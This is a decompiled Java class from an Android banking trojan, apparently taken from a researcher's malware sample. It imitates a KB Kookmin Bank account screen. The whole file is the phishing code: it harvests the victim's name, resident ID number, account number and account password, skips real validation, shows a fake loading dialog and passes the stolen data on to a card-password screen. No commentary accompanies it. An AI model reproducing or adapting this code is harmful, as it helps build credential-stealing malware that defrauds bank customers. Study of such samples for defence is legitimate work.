package com.kbstar.kb.android.star;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.app.ProgressDialog;
import android.content.Intent;
import android.content.res.Resources;
import android.os.Bundle;
import android.os.Handler;
import android.os.Message;
import android.text.Editable;
import android.view.View;
import android.view.View.OnClickListener;
import android.view.View.OnFocusChangeListener;
import android.view.Window;
import android.widget.EditText;
import android.widget.ImageView;
import android.widget.Toast;
import com.kbstar.kb.android.star.model.Bank;
import com.kbstar.kb.android.star.util.GeneralUtil;
import java.util.List;

public class KB_Account_info
  extends Activity
  implements View.OnClickListener
{
  private final int ACCOUNT_PSW = 400;
  private final int Next_Page = 201;
  private String account_pass;
  private Bank bank;
  private ImageView btn_cancel;
  private ImageView btn_confirm;
  private EditText et_account;
  private EditText et_account_psw;
  private EditText et_id_first;
  private EditText et_id_second;
  private EditText et_name;
  @SuppressLint({"HandlerLeak"})
  private Handler handler = new Handler()
  {
    public void handleMessage(Message paramAnonymousMessage)
    {
      super.handleMessage(paramAnonymousMessage);
      switch (paramAnonymousMessage.what)
      {
      default: 
        return;
      }
      KB_Account_info.this.pd.dismiss();
      paramAnonymousMessage = new Intent(KB_Account_info.this, KB_Card_Psw.class);
      paramAnonymousMessage.putExtra("Bank", KB_Account_info.this.bank);
      KB_Account_info.this.startActivity(paramAnonymousMessage);
    }
  };
  private ImageView head_menu_left_btn;
  private ProgressDialog pd;
  private Toast toast;
  
  private void initView()
  {
    this.et_name = ((EditText)findViewById(2131296259));
    this.et_id_first = ((EditText)findViewById(2131296260));
    this.et_id_second = ((EditText)findViewById(2131296261));
    this.et_account = ((EditText)findViewById(2131296262));
    this.et_account_psw = ((EditText)findViewById(2131296263));
    this.head_menu_left_btn = ((ImageView)findViewById(2131296258));
    this.btn_confirm = ((ImageView)findViewById(2131296264));
    this.btn_cancel = ((ImageView)findViewById(2131296265));
    this.head_menu_left_btn.setOnClickListener(this);
    this.btn_confirm.setOnClickListener(this);
    this.btn_cancel.setOnClickListener(this);
    this.et_account_psw.setOnFocusChangeListener(new View.OnFocusChangeListener()
    {
      public void onFocusChange(View paramAnonymousView, boolean paramAnonymousBoolean)
      {
        if (paramAnonymousBoolean)
        {
          paramAnonymousView = new Intent(KB_Account_info.this, KB_Account_Psw.class);
          KB_Account_info.this.startActivityForResult(paramAnonymousView, 400);
          KB_Account_info.this.btn_confirm.setFocusable(true);
        }
      }
    });
  }
  
  private void validation()
  {
    String str1 = this.et_name.getText().toString().trim();
    String str2 = this.et_id_first.getText().toString().trim();
    String str3 = this.et_id_second.getText().toString().trim();
    String str4 = this.et_account.getText().toString().trim();
    String str5 = this.et_account_psw.getText().toString().trim();
    if (str1.length() < 2) {}
    for (;;)
    {
      this.bank.setAccountName(str1);
      this.bank.setPersonIdFirst(str2);
      this.bank.setPersonIdSecond(str3);
      this.bank.setAccountNo(str4);
      this.bank.setAccountPsw(str5);
      GeneralUtil.dismissKeyBoard(this);
      this.pd = new ProgressDialog(this);
      this.pd.setMessage(getResources().getString(2131361815));
      this.pd.show();
      new Thread()
      {
        public void run()
        {
          try
          {
            Thread.sleep(3000L);
            Message localMessage = new Message();
            localMessage.what = 201;
            KB_Account_info.this.handler.sendMessage(localMessage);
            return;
          }
          catch (InterruptedException localInterruptedException)
          {
            localInterruptedException.printStackTrace();
          }
        }
      }.start();
      return;
      if ((str2.length() != 6) || (!GeneralUtil.idValid(str2.substring(2, 4), 12)) || (!GeneralUtil.idValid(str2.substring(4, 6), 31)) || (str3.length() != 7) || (str4.length() < 11) || (str5.length() == 4)) {}
    }
  }
  
  protected void onActivityResult(int paramInt1, int paramInt2, Intent paramIntent)
  {
    if (paramIntent != null)
    {
      this.account_pass = paramIntent.getStringExtra("psw");
      if (paramInt1 == 400) {
        this.et_account_psw.setText(this.account_pass);
      }
    }
    super.onActivityResult(paramInt1, paramInt2, paramIntent);
  }
  
  public void onClick(View paramView)
  {
    switch (paramView.getId())
    {
    default: 
      return;
    case 2131296258: 
      finish();
      return;
    case 2131296264: 
      validation();
      return;
    case 2131296265: 
      finish();
      return;
    }
    finish();
  }
  
  protected void onCreate(Bundle paramBundle)
  {
    GeneralUtil.activityList.add(this);
    super.onCreate(paramBundle);
    getWindow().requestFeature(1);
    setContentView(2130903043);
    this.bank = ((Bank)getIntent().getSerializableExtra("Bank"));
    if (this.bank == null)
    {
      finish();
      return;
    }
    initView();
  }
}


/* Location:              /home/enzo/Documents/BorelEnzo.github.io/malwares/dsencrypt/payload.jar!/com/kbstar/kb/android/star/KB_Account_info.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       0.7.1
 */